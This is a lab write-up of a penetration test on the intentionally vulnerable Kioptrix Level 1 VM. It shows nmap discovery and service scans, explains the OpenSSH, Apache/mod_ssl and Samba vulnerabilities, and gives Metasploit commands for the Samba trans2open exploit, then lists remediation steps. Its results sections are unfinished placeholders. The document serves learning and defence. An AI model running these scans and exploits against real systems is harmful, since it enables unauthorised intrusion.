# Kioptrix Level 1 — Penetration Test Walkthrough

A hands-on walkthrough documenting the technical process behind the Kioptrix findings in the [capstone report](./My%20Capstone%20Project%20Result%201.0.pdf): discovering the target, identifying vulnerable services, and exploiting one of them to gain access.

**Attacker machine:** Kali Linux
**Target:** Kioptrix Level 1 (intentionally vulnerable VM)
**Environment:** VirtualBox, both VMs on the same NAT Network

---

## 1. Setup

Kali and Kioptrix were placed on the same VirtualBox **NAT Network** (not plain NAT), so both machines could reach each other while staying isolated from the host network.

A networking issue came up during setup: Kioptrix's `eth0` interface wasn't appearing at all (`/sbin/ifconfig -a` showed only the loopback interface). This turned out to be caused by the VM's emulated network adapter — Kioptrix's old kernel didn't support the default **Intel PRO/1000 MT Desktop** adapter type. Switching the adapter type to **PCnet-FAST III** in VirtualBox resolved it, and `eth0` came up correctly after a restart.

**Lesson for the report:** even environment setup is part of the assessment process — older systems can have compatibility issues that have nothing to do with the vulnerabilities being tested, but still need to be worked through.

## 2. Host Discovery

With both machines confirmed on the same network, a ping sweep was run from Kali to find live hosts:

```
nmap -sn 10.0.2.0/24
```

**Result:**

```
Nmap scan report for 10.0.2.2    (gateway)
Nmap scan report for 10.0.2.15   (Kioptrix — target)
Nmap scan report for 10.0.2.4    (Kali)
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.06 seconds
```

Target identified: **10.0.2.15**

## 3. Port and Service Scan

A full TCP port scan with service/version detection was run against the target:

```
nmap -sV -p- -T4 10.0.2.15
```

**Result:**

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: yJMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```

This confirms the three vulnerabilities identified in the capstone report, plus two additional open services (`rpcbind`, `status`) worth noting even though they weren't exploited.

## 4. Vulnerability Breakdown (Plain-English)

**OpenSSH 2.9p2 — port 22**
SSH is the "remote login" door into a server. This version dates to the early 2000s and has known weaknesses that can let an attacker crash the service or, in some configurations, bypass authentication.

**Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b — ports 80/443**
This combination carries a well-documented vulnerability (CVE-2002-0082) that lets an attacker send crafted data to the HTTPS port and run their own commands on the server — effectively taking it over through the web server itself.

**Samba smbd — port 139 (exploited below)**
Samba handles Windows-style file sharing on Linux. This version is vulnerable to the `trans2open` buffer overflow: a corrupted/oversized request confuses the service's memory handling, letting an attacker smuggle in and run their own code with the service's privileges.

## 5. Exploitation — Samba `trans2open`

**Tool:** Metasploit Framework (`msfconsole`)

```
msfconsole
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS 10.0.2.15
set LHOST <Kali IP>
exploit
```

**What happened:** `trans2open` is a brute-force memory exploit — it doesn't know the exact memory address it needs ahead of time, so it works through a range of possible return addresses until one lands correctly. The attempt produced several near-successful connections (sessions that opened briefly and then closed as invalid) before a stable session was reached, which is expected behavior for this exploit rather than a failure.

<!-- TODO: paste final successful output here, including a screenshot/transcript showing:
  - the session opening successfully
  - `getuid` or `id` output showing the privilege level obtained
-->

## 6. Impact

<!-- TODO: fill in once shell is confirmed — what access was obtained, what an attacker could do with it (e.g. root access = full system compromise, access to any data on the box, ability to pivot further into the network) -->

## 7. Remediation

Mirrors the controls from the capstone report:

- Apply a formal patch management process and update Apache to a supported, maintained version
- Upgrade OpenSSH and disable legacy protocol versions
- Restrict Samba access to authorized hosts/users, disable unnecessary shares, and keep it updated
- Regularly run vulnerability scans to catch outdated, exploitable services like these before an attacker does

---

*This exercise was performed in an isolated lab environment against an intentionally vulnerable machine, for educational purposes only.*
